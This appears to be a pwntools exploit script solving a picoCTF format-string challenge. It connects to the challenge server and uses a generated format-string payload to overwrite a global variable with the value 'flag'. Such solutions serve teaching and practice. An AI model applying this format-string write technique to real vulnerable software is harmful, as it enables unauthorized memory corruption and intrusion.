
from pwn import *

# Running checksec to examine/confirm defense systems.
e = ELF('./vuln')

# Sets the reference to the vuln program to consider architecture, endianness, etc.
# This is required to process the length of the payload.
context.binary = './vuln'

# Setting the HOST and PORT as provided by the challenge.
HOST = 'rhea.picoctf.net'
PORT = 58703  # This value would change after every new launch of instance.

# Setting an 'if' condition to easily switch between local and remote.
DEBUG = False
if DEBUG == False:
    s = remote(HOST, PORT)
else:
    s = process('./vuln')

# Response after connection is made.
res = s.recvline().decode()
print(res)

# Setting necessary variables.
sus_addr = int('404060', 16)
new_val = int('67616c66', 16)
offset = 14
addresses = {sus_addr: new_val}

# Setting the payload.
# Options for write_size are 'byte' (default), 'short', and 'int', which are %hhn (1-byte), %hn (2-byte), and %n (4-byte), respectively.
payload = fmtstr_payload(offset, addresses, write_size='byte')

# Printing payload value for further analysis.
print(payload)

# Sending payload as input to the vuln program.
s.sendline(payload)
s.interactive()
